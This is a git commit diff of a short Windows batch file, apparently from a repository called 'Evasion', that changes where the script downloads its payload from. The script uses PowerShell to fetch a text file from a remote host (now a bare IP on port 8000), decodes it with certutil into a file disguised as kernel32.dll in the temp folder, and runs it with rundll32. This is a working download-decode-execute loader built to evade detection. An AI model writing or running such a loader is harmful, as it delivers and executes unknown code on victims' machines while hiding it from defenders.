767f626264a3254dbccff51e91307e309964b02e
fab <59584067+FabFromTheSnow@users.noreply.github.com>
2023-04-26 22:22:35 -0400

    Update oui.bat

--- oui.bat
+++ oui.bat
@@ -1,5 +1,6 @@
 @echo off
-powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FabFromTheSnow/Evasion/main/dll.txt' -OutFile '%temp%\dll.txt'"
+powershell -command "Invoke-WebRequest -Uri '10.18.26.40:8000/dll.txt' -OutFile '%temp%\dll.txt'"
 certutil -decode "%temp%\dll.txt" "%temp%\kernel32.dll"
-rundll32.exe "%temp%\kernel32.dll",MessageBoxA 0 "Hello from kernel32.dll!" "Message" 0x40
+rundll32.exe "%temp%\kernel32.dll",DllMain
+
 
